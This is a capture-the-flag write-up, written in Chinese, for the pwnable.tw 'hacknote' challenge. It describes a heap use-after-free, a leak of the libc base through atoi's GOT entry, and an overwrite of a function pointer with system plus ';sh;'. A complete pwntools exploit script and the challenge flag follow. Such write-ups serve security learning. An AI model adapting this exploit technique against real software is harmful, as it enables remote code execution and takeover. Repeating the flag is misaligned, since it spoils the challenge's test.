# hacknote [200 pts]

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

## concept

首先 add 兩塊比 note struct size 還大的 content 接著把他們 free 掉

之後 add 一塊 content 大小為 note struct size 的 memory 根據 fast bin 他的 content 會拿到之前 free 掉的 chunk，存在 **use after free** 的漏洞

將 (*printnote)() 填入 print_note_content 的 address 改掉 *content 為 atoi 的 got 接著 call print_note 即可藉此 address 算出 libc base address

再來 add 一塊比剛剛兩個都大的 memory 接著 free 掉，再 add note struct size 就可以直接蓋掉先前的 note 並直接把 (*printnote)() 改為 system address 並且後面加上 ```;sh;``` 接著 call print_note 就可以獲得 shell

## exploit

```python
#!/usr/bin/env python

from pwn import *

r = remote("chall.pwnable.tw", 10102)
# r = process('./hacknote', env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc_32.so.6")})

def add_note(sz, data):
    r.sendafter(':', '1')
    r.sendafter(':', str(sz))
    r.sendafter(':', str(data))

def del_note(idx):
    r.sendafter(':', '2')
    r.sendafter(':', str(idx))

def print_note(idx):
    r.sendafter(':', '3')
    r.sendafter(':', str(idx))


print_addr = 0x804862B
atoi_got = 0x804a034

add_note(40, 'lala')
add_note(40, 'gaga')
del_note(0)
del_note(1)
add_note(8, p32(print_addr) + p32(atoi_got))
print_note(0)
libc = u32(r.recvline()[:-1].ljust(4, '\x00')) - 0x002d050
log.info('libc base address: {}'.format(hex(libc)))
del_note(2)

add_note(80, 'aaaa')
del_note(3)
add_note(8, flat([libc + 0x3a940, ";sh;"]))
print_note(0)

r.interactive()
```

## flag

```FLAG{Us3_aft3r_fl3333_in_h4ck_not3}```
